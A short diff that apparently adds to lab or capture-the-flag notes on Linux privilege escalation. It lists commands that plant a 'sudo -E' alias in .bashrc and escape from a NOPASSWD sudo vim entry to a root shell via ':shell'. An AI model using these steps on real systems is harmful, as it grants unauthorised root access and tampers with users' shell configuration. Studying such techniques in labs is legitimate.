@@ -15,5 +15,16 @@ vi .vmscript
 !/bin/bash
 echo "hacked" > /tmp/hacker.txt
 
+------------------------------------------------
+
+echo 'alias sudo ='sudo -E'' >> .bashrc
+source ~/.bashrc
+
+sudo -l ->  (root) NOPASSWD: /usr/bin/vim /opt/important.conf 
+
+Login as victim user -> sudo vim  /opt/important.conf  -> :shell -> id=root
+
+
+
 
 
